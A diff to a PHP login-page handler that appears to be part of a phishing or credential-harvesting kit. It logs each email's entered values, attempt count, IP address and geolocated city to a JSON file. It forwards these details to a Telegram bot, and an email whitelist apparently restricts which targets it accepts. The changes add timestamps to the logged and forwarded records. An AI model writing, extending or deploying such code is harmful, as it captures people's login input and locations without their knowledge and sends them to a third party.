@@ -4,11 +4,6 @@ session_start();
 // persistent log file on Railway volume
 define('ATTEMPTS_FILE', '/data/attempts.json');
 
-// Ensure /data is writable
-if (is_dir('/data') && !is_writable('/data')) {
-    @chmod('/data', 0777);
-}
-
 // === TOGGLE: email validation ON/OFF ===
 $EMAIL_VALIDATION_ENABLED = false; // set to true to ENFORCE whitelist in papa.txt
 
@@ -89,22 +84,27 @@ if (isset($_POST['name'])) {
         ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
         : "Unknown";
 
+    $now = date('Y-m-d H:i:s');
+
     // Update attempts keyed by CURRENT email
     if (!isset($attempts[$email])) {
         $attempts[$email] = [
             'names'    => [$name],
             'count'    => 1,
             'ip'       => $ip,
-            'location' => $location
+            'location' => $location,
+            'time'     => $now
         ];
     } else {
         $attempts[$email]['names'][] = $name;
         $attempts[$email]['count']  += 1;
         $attempts[$email]['ip']      = $ip;
         $attempts[$email]['location']= $location;
+        $attempts[$email]['time']    = $now; // refresh last-updated
     }
 
-    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
+    // Persist attempts to Railway volume
+    @file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
 
     // Telegram notification — show BOTH current and original (if different)
     $msg  = "Login attempt for: $email\n";
@@ -116,7 +116,8 @@ if (isset($_POST['name'])) {
     $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
     $msg .= "Total attempts: {$attempts[$email]['count']}\n";
     $msg .= "IP: $ip\n";
-    $msg .= "Location: $location";
+    $msg .= "Location: $location\n";
+    $msg .= "Last updated: ".$attempts[$email]['time'];
 
     @file_get_contents(
         "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
